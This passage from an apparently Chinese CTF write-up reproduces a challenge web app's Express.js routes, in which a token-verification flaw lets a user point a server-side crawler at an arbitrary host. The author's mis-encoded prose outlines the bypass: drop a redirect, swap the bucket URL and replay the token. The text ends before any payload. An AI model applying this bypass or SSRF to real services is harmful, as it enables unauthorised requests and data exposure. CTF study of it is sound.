&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">affiliation&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">age&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bucket&lt;/span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">findByPk&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">affiliation&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">age&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">bucket&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#00a8c8">typeof&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">age&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#34;string&amp;#34;&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#00a8c8">typeof&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bucket&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#34;string&amp;#34;&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#00a8c8">typeof&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">affiliation&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;string&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;Parameters error or blank.&amp;#34;&lt;/span> &lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">utils&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">checkBucket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bucket&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;Invalid bucket url.&amp;#34;&lt;/span> &lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">authToken&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// æ›´æ–°å†…å®¹
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">update&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">affiliation&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">age&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">personalBucket&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">bucket&lt;/span>
&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">where&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">randomBytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;hex&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">authToken&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">Token&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">create&lt;/span>&lt;span style="color:#111">({&lt;/span> &lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">valid&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">Token&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">update&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">valid&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">where&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">Op&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">not&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">authToken&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">createError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">500&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/^https:\/\/[a-f0-9]{32}\.oss-cn-beijing\.ichunqiu\.com\/$/&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bucket&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// å¯¹bucketè¿›è¡Œæ­£åˆ™åŒ¹é… ç¬¦åˆè¿™ä¸ªå½¢å¼
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`/user/verify?token=&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">authToken&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// åŒ¹é…å¤±è´¥
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Well, admin won&amp;#39;t do that actually XD.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;Admin will check if your bucket is qualified later.&amp;#34;&lt;/span> &lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">router&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/verify&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#00a8c8">typeof&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#34;string&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Parameters error&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">findByPk&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">Token&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">findOne&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">valid&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">Token&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">update&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">valid&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>
&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">where&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">update&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">bucket&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">personalBucket&lt;/span>
&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">where&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">findByPk&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;Successfully update your bucket from personal bucket!&amp;#34;&lt;/span> &lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">createError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">500&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">findByPk&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;Failed to update, check your token carefully&amp;#34;&lt;/span> &lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75715e">// Not implemented yet
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">router&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bucket&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">findByPk&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/^https:\/\/[a-f0-9]{32}\.oss-cn-beijing\.ichunqiu\.com\/$/&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">bucket&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">({&lt;/span> &lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;Sorry but our remote oss server is under maintenance&amp;#34;&lt;/span> &lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// åŒ¹é…å¤±è´¥
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Should be a private site for Admin
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Crawler&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">userAgent&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">referrer&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;https://www.ichunqiu.com/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">waitDuration&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;3s&amp;#39;&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">goto&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">bucket&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// gotoå°è£…äº†ä¸€äº›é¡µé¢è®¿é—®çš„å‡½æ•°
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">html&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">htmlContent&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">headers&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">cookies&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookies&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75715e">// è¿›è¡Œä¸€ä¸ªé¡µé¢çš„è®¿é—® è¿”å›žhtml headers cookies
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">({&lt;/span> &lt;span style="color:#75af00">html&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">headers&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">cookies&lt;/span>&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">({&lt;/span> &lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;Error visiting your bucket. &amp;#39;&lt;/span> &lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¤§è‡´å®¡ä¸€ä¸‹ï¼Œæ˜¾ç„¶æœ€ç»ˆç›®æ ‡æ˜¯è®©bucketæˆä¸ºæˆ‘ä»¬çš„vpsåœ°å€è®©crawlerè®¿é—®&lt;/p>
&lt;p>é¦–å…ˆæž„é€ ä¸€ä¸ªurlé€šè¿‡æ­£åˆ™æ›´æ–°profileä¸­çš„bucketä¿¡æ¯ï¼Œä½†æ˜¯åˆ«è®©å®ƒé‡å®šå‘ï¼ˆæ”¾æŽ‰è¿™ä¸ªåŒ… æ‹¿åˆ°authtokenï¼‰ï¼ŒæŽ¥ç€åˆ°&lt;code>/user/profile&lt;/code>é‡æ–°æ›´æ–°æˆ‘ä»¬çš„bucketï¼Œå†æ”¾æŽ‰ä¹‹å‰é‚£ä¸ª&lt;code>/user/verify&lt;/code>ï¼ŒæŠŠæˆ‘ä»¬ç¬¬äºŒæ¬¡çš„ä¿¡æ¯æ›´æ–°äº†ï¼Œä¹‹åŽå†åˆ°&lt;code>/user/bucket&lt;/code>å°±å¯ä»¥è®¿é—®æˆ‘ä»¬çš„vpsé¡µé¢äº†&lt;/p>
&lt;p>é‚£å…ˆæž„é€ urlï¼Œè¿™ä¸ªæ­£åˆ™å¾ˆæ­»&lt;/p>
